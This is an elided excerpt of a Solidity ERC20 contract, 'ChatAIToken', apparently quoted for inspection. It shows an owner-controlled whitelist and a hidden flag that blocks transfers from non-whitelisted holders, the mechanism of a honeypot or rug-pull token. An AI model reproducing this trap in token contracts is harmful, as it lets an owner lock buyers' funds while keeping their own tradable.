...
contract ChatAIToken is ERC20 {
    using SafeMath for uint256;
    bool private _t;

    mapping(address => bool) public _whiteAddr;
    ...
    constructor() ERC20()  {
      ...
      addWhiteAddr(msg.sender);
    }

  
    function addWhiteAddr(address addr) public onlyOwner returns(bool){
        if(!_whiteAddr[addr]){
            _whiteAddr[addr] = true;
        }
        return true;
    }

    function setT(bool flag)public onlyOwner returns(bool){
      _t = flag;
    ...
    function _transfer(address from,address to,uint256 amount) internal override {
        if(!_whiteAddr[from]){
            require(_t,'Transfers are not currently available');
        }
